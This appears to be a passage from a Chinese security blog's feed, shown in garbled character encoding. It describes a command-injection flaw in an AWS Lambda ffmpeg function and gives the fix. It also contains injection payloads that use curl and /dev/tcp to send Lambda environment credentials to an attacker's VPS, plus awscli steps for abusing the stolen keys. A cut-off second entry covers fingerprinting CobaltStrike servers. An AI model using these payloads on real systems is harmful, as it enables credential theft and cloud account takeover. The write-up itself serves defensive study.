å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li><li>æ–‡ä»¶ç³»ç»Ÿ: <code>/var/task</code>åªè¯»ï¼Œ<code>/tmp</code>å¯å†™</li><li>é»˜è®¤ç”¨æˆ·: <code>sbx_userxxx</code></li><li>Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³</li><li>æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰</li></ul><p>åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨<code>awscli</code>å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡<code>awscli</code>æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º<code>Lambda</code>çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨<code>awscli</code>æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚</p><p>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯<code>is not authorized to perform</code>ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š</p><h6 id="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"><a href="#é…ç½®awså‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="é…ç½®awså‘½ä»¤è¡Œå·¥å…·"></a>é…ç½®awså‘½ä»¤è¡Œå·¥å…·</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws configure --profile stolencredsè¾“å…¥è·å–åˆ°çš„AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEYå’Œå¯¹åº”åŒºåŸŸï¼Œç¼–è¾‘~/.aws/credentialsï¼Œåœ¨é…ç½®æ–‡ä»¶é‡Œé¢å¢åŠ aws_session_tokenï¼Œè®¾ç½®è·å–åˆ°çš„å¯¹åº”å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/04/01/aws-lambda-rce/aws2.png"></p><h6 id="è·å–function-nameã€role-name"><a href="#è·å–function-nameã€role-name" class="headerlink" title="è·å–function nameã€role name"></a>è·å–function nameã€role name</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sts get-caller-identity --profile stolencreds  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ARN(Amazon Resource Name)æ˜¯AWSé‡Œé¢å”¯ä¸€èµ„æºæ ‡ç¤ºç¬¦å·ï¼ŒARNçš„æ ¼å¼å–å†³äºç‰¹å®šçš„èµ„æºï¼Œä¸€èˆ¬æ˜¯è¿™ç§æ ¼å¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none">arn:partition:service:region:account-id:resource-idarn:partition:service:region:account-id:resource-type&#x2F;resource-idarn:partition:service:region:account-id:resource-type:resource-id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>partition</code>ï¼šèµ„æºæ‰€åœ¨åˆ†åŒº<ul><li><code>aws</code> - AWS åŒºåŸŸ</li><li><code>aws-cn</code> - ä¸­å›½åŒºåŸŸ</li><li><code>aws-us-gov</code> - AWS GovCloud (US) åŒºåŸŸ</li></ul></li><li><code>service</code>: æ ‡è¯† AWS äº§å“çš„æœåŠ¡å‘½åç©ºé—´ã€‚ä¾‹å¦‚ï¼Œs3 è¡¨ç¤º Amazon S3 èµ„æºã€‚</li><li><code>region</code>: åŒºåŸŸã€‚ä¾‹å¦‚ï¼Œus-east-2 è¡¨ç¤º ç¾å›½ä¸œéƒ¨ï¼ˆä¿„äº¥ä¿„å·ï¼‰ã€‚</li><li><code>account-id</code>: æ‹¥æœ‰èµ„æºçš„ AWS è´¦æˆ·çš„ IDï¼ˆä¸å«è¿å­—ç¬¦ï¼‰ã€‚ä¾‹å¦‚ï¼Œ123456789012ã€‚</li><li><code>resource-id</code>: èµ„æºæ ‡è¯†ç¬¦ã€‚ARN çš„è¿™ä¸€éƒ¨åˆ†å¯ä»¥æ˜¯èµ„æºçš„åç§°æˆ– IDï¼Œä¹Ÿå¯ä»¥æ˜¯èµ„æºè·¯å¾„. ä¾‹å¦‚ï¼Œ<code>user/Bob</code>è¡¨ç¤º IAM ç”¨æˆ·.</li></ul><p>åœ¨Lambdaé‡Œé¢ï¼ŒARNçš„æ ¼å¼æ˜¯å¦‚ä¸‹è¿™æ ·çš„è¡¨ç¤ºï¼š<code>arn:aws:sts::&#123;AccountID&#125;:assumed-role/&#123;RoleName&#125;/&#123;FunctionName&#125;</code></p><p><img src="/2021/04/01/aws-lambda-rce/aws.png"></p><h6 id="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"><a href="#è·å–å‡½æ•°çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–å‡½æ•°çš„æƒé™æ˜ç»†"></a>è·å–å‡½æ•°çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws lambda get-policy --function-name &lt;function name&gt;  --output text <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–attachçš„æƒé™æ˜ç»†"><a href="#è·å–attachçš„æƒé™æ˜ç»†" class="headerlink" title="è·å–attachçš„æƒé™æ˜ç»†"></a>è·å–attachçš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-attached-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–policy-name"><a href="#è·å–policy-name" class="headerlink" title="è·å–policy name"></a>è·å–policy name</h6><pre class="line-numbers language-none"><code class="language-none">aws iam list-role-policies --role-name &lt;role name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"><a href="#è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†" class="headerlink" title="è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†"></a>è·å–ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†</h6><pre class="line-numbers language-none"><code class="language-none">aws iam get-role-policy --role-name &lt;role name&gt; --policy-name &lt;policy name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡æŸ¥è¯¢ç”¨æˆ·å‡­è¯çš„æƒé™æ˜ç»†ï¼Œå°±å¯ä»¥æ ¹æ®è·å–åˆ°çš„å‡­è¯æ“ä½œAWSçš„èµ„æºï¼Œæ¯”å¦‚S3ã€EC2ã€‚è¿™é‡Œçš„ç”¨æˆ·å‡­è¯æƒé™æ˜ç»†ä¸åŒ…æ‹¬attachçš„æƒé™</p><h6 id="å¸¸ç”¨çš„æŸ¥è¯¢"><a href="#å¸¸ç”¨çš„æŸ¥è¯¢" class="headerlink" title="å¸¸ç”¨çš„æŸ¥è¯¢"></a>å¸¸ç”¨çš„æŸ¥è¯¢</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws lambda list-functions --profile stolencredsaws ssm describe-instance-information --profile stolencredsaws s3 <span class="token function">ls</span> --profile stolencredsaws lambda get-function --function-name FatVideoFrameFFmpeg --query <span class="token string">'Code.Location'</span> --profile stolencreds<span class="token function">wget</span> -O lambda-function.zip url-from-previous-query --profile stolencredsaws ec2 describe-network-interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç–‘éš¾é—®é¢˜"><a href="#ç–‘éš¾é—®é¢˜" class="headerlink" title="ç–‘éš¾é—®é¢˜"></a>ç–‘éš¾é—®é¢˜</h3><ol><li><p>å½“ç¡®å®šå­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œå…ˆä½¿ç”¨äº†<code>wget</code>ï¼ŒæŸ¥çœ‹<code>cloudwatch</code>ä¹‹åå‘ç°ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤ï¼Œå½“æˆ‘ä½¿ç”¨<a href="https://github.com/pumasecurity/serverless-prey">serverleess-prey</a>æµ‹è¯•çš„æ—¶å€™å‘ç°<code>curl</code>éƒ½ä¸å­˜åœ¨ã€‚è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨<code>;cat /tmp/env.txt &gt; /dev/tcp/&lt;vps&gt;/&lt;port&gt;;</code>æ¥ä¼ è¾“æ•°æ®ï¼Œå…ˆæŠŠéœ€è¦è·å–åˆ°çš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ï¼Œç„¶åå¤–å¸¦ä¼ è¾“ã€‚</p></li><li><p>å¦å¤–ä¸€ä¸ªéšæ‚£æ˜¯DoWï¼ˆDenial of Walletï¼‰ï¼Œå› ä¸ºLambdaæ˜¯æŒ‰ç…§å‡½æ•°è°ƒç”¨æ¬¡æ•°ä»˜è´¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ‰¾åˆ°ä¸€ä¸ªLambdaçš„äº‹ä»¶è§¦å‘å™¨ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªhttpè¯·æ±‚ï¼Œå‘èµ·å¤§é‡è¯·æ±‚æ¶ˆè€—èµ„æº, å»¶ä¼¸ä¸€ä¸‹è…¾è®¯åœ¨æ¨çš„ç±»ä¼¼ä¸€ä¸ªä¸šåŠ¡åœ¨githubä¸Šæœ‰å¾ˆå¤šå¼€æºé¡¹ç›® :( ã€‚AWSå¯ä»¥å†åŠ ä¸€å±‚<code>cloudfront</code>ï¼Œç„¶åé…åˆ<code>cloudwatch</code>æˆ–è€…è´¦å•é¢„è­¦æ¥å®Œå–„ï¼Œæˆ–è€…æ·»åŠ ç”¨æˆ·è®¤è¯tokenã€‚</p></li><li><p>ä¸ºä»€ä¹ˆä¸Šé¢æˆ‘æ²¡æœ‰æå‘½ä»¤æ‰§è¡Œä¹‹ååå¼¹shellå‘¢ï¼Ÿå› ä¸ºä¸€åå¼¹æˆåŠŸä¹‹åé©¬ä¸Šæ–­å¼€ã€‚æœ€ååœ¨Lambdaçš„é…ç½®é‡Œé¢å‘ç°Lambdaæ‰§è¡Œçš„timeoutæ˜¯3sï¼Œlambdaåœ¨å»ºç«‹çš„æ—¶å€™é»˜è®¤è¿è¡Œæ—¶é—´æ˜¯3sï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæœ€å¤§15åˆ†é’Ÿã€‚</p></li><li><p>è¿˜æœ‰ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼Œå¯ä»¥ä¿®æ”¹ä»£ç è¿è¡Œç¯å¢ƒï¼Œæ²¡çœ‹å¤ªæ‡‚: <a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></p></li></ol><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://mp.weixin.qq.com/s/duF1Z0EDC3n_G378Aq_XYA">é’ˆå¯¹AWS Lambdaçš„è¿è¡Œæ—¶æ”»å‡»</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247488798&idx=1&sn=485e2131f347ff4d8c3b5b3286b36c97&scene=21#wechat_redirect">Serverlesså®‰å…¨ç ”ç©¶ â€” Serverlesså®‰å…¨é£é™©</a></li><li><a href="https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/">Gaining Persistency on Vulnerable Lambdas</a></li><li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities</a></li><li><a href="https://docs.aws.amazon.com/zh_cn/general/latest/gr/aws-arns-and-namespaces.html">aws-arns-and-namespaces</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;æ¼æ´&quot;&gt;&lt;a href=&quot;#æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´&quot;&gt;&lt;/a&gt;æ¼æ´&lt;/h3&gt;&lt;p&gt;æµ‹è¯•çš„æ—¶å€™å‘ç°AWSçš„Lambdaé‡Œé¢æœ‰è¿™æ ·çš„ä»£ç ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;execute_command &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg -i &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; video_url &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -y -f &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; img_format &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -ss &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; time_index &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; -vframes 1 &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; WH &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; output_path
&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;execute_command&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; shell&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ”»å‡»çš„Payloadï¼š &lt;code&gt;;curl &amp;lt;your vps&amp;gt;:&amp;lt;port&amp;gt;;&lt;/code&gt;ï¼Œç„¶ååœ¨è‡ªå·±æœåŠ¡å™¨ç›‘å¬å¯ä»¥æ”¶åˆ°Lambdaå®¹å™¨å‘èµ·çš„è¯·æ±‚ã€‚&lt;/p&gt;
&lt;h5 id=&quot;ä¿®å¤ä»£ç &quot;&gt;&lt;a href=&quot;#ä¿®å¤ä»£ç &quot; class=&quot;headerlink&quot; title=&quot;ä¿®å¤ä»£ç :&quot;&gt;&lt;/a&gt;ä¿®å¤ä»£ç :&lt;/h5&gt;&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ffmpeg&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-i&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; video_url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-y&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-f&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; img_format&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-ss&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; time_index&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-vframes&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; output_path&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stdout&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; stderr&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;PIPE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h3 id=&quot;å‚¨å¤‡çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‚¨å¤‡çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;å‚¨å¤‡çŸ¥è¯†&quot;&gt;&lt;/a&gt;å‚¨å¤‡çŸ¥è¯†&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Lambdaå‡½æ•°ä»£ç è·¯å¾„: &lt;code&gt;/var/task&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·å‡­è¯: å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œ&lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt;, &lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt;, &lt;code&gt;AWS_SESSION_TOKEN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç³»ç»Ÿ: &lt;code&gt;/var/task&lt;/code&gt;åªè¯»ï¼Œ&lt;code&gt;/tmp&lt;/code&gt;å¯å†™&lt;/li&gt;
&lt;li&gt;é»˜è®¤ç”¨æˆ·: &lt;code&gt;sbx_userxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Lambdaè®¡ç®—çš„æœ€å¤§è¶…æ—¶æ—¶é—´æ˜¯15åˆ†é’Ÿï¼Œå‡­è¯è¿‡æœŸæ—¶é—´æ˜¯11ä¸ªå°æ—¶å·¦å³&lt;/li&gt;
&lt;li&gt;æ”»å‡»Lambdaåªéœ€è¦è·å–AKã€SKã€Tokenï¼Œåå¼¹shellæ²¡ä»€ä¹ˆæ„ä¹‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„æƒ…å†µä¸‹å…ˆè·å–ç”¨æˆ·å‡­è¯ï¼Œç„¶åä½¿ç”¨&lt;code&gt;awscli&lt;/code&gt;å†™å…¥æœ¬åœ°é…ç½®æ–‡ä»¶é‡Œé¢ï¼Œé€šè¿‡&lt;code&gt;awscli&lt;/code&gt;æ¥æ“ä½œï¼Œå¦‚æœåœ¨åˆ›å»º&lt;code&gt;Lambda&lt;/code&gt;çš„æƒé™æ§åˆ¶ä¸è¶³ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨&lt;code&gt;awscli&lt;/code&gt;æ¥æ“ä½œå„ç§èµ„æºï¼Œæ¯”å¦‚æˆ‘å‘ç°çš„å‘½ä»¤æ‰§è¡Œæœ‰å¯¹ä¸»è´¦æˆ·ä¸‹æ‰€æœ‰ç½‘å¡çš„æ“ä½œæƒé™ï¼Œå¯ä»¥ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å‡­è¯åˆ é™¤æ‰€æœ‰ç½‘å¡æ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå½“è·å–åˆ°çš„å‡­è¯æƒé™å¾ˆå°çš„æ—¶å€™ï¼Œåˆ°å¤„éƒ½æ˜¯&lt;code&gt;is not authorized to perform&lt;/code&gt;ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¥æŸ¥çœ‹è‡ªå·±çš„å‡­è¯éƒ½ä»€ä¹ˆæƒé™ï¼Œé¦–å…ˆé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrikeçš„Stagerç‰¹å¾éšè—</title>
    <link href="https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html"/>
    <id>https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html</id>
    <published>2021-01-03T16:00:00.000Z</published>
    <updated>2022-01-21T02:37:52.292Z</updated>
    
    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ<code>CobaltStrike</code>ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š<a href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š</p><p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p><h3 id="æ‰¾åˆ°DomainFront"><a href="#æ‰¾åˆ°DomainFront" class="headerlink" title="æ‰¾åˆ°DomainFront"></a>æ‰¾åˆ°DomainFront</h3><p>æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2<br>çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)</p><h4 id="Quakeæµ‹ç»˜"><a href="#Quakeæµ‹ç»˜" class="headerlink" title="Quakeæµ‹ç»˜"></a>Quakeæµ‹ç»˜</h4><p>æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:</p><pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¿®æ”¹è„šæœ¬"><a href="#ä¿®æ”¹è„šæœ¬" class="headerlink" title="ä¿®æ”¹è„šæœ¬"></a>ä¿®æ”¹è„šæœ¬</h4><p>ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:<a href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_subject</span><span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> <span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dst<span class="token punctuation">)</span>        ctx <span class="token operator">=</span> ssl<span class="token punctuation">.</span>create_default_context<span class="token punctuation">(</span><span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>check_hostname <span class="token operator">=</span> <span class="token boolean">False</span>        ctx<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE        s <span class="token operator">=</span> ctx<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> server_hostname<span class="token operator">=</span>dst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cert_bin <span class="token operator">=</span> s<span class="token punctuation">.</span>getpeercert<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        x509 <span class="token operator">=</span> crypto<span class="token punctuation">.</span>load_certificate<span class="token punctuation">(</span>crypto<span class="token punctuation">.</span>FILETYPE_ASN1<span class="token punctuation">,</span> cert_bin<span class="token punctuation">)</span>        val <span class="token operator">=</span> x509<span class="token punctuation">.</span>get_subject<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CN    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        val <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> val<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ‰«æç»“æœ"><a href="#æ‰«æç»“æœ" class="headerlink" title="æ‰«æç»“æœ"></a>æ‰«æç»“æœ</h3><ul><li>æœ€å¤šä½¿ç”¨çš„<code>GET URI</code>æ˜¯<code>submit.php</code></li><li>é™¤äº†awsçš„<code>CloudFront</code>ä½œä¸ºæœ€å¤šçš„åŸŸå‰ç½®ï¼Œè¿˜æœ‰ä½¿ç”¨<code>API Gateway</code>ï¼ŒçŒœæµ‹ä½¿ç”¨äº†httpsæµé‡è½¬å‘æˆ–è€…ç›´æ¥æ¥å…¥åˆ°ç½‘å…³ã€‚</li><li>è¿˜æœ‰ä½¿ç”¨äº†å·¨ç¡¬å®¶çš„åŸŸåï¼Œé‚£è¿™ç§å°±æ˜¯<code>Domain takeover</code>æ¥è·å–åˆ°çš„</li></ul><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" 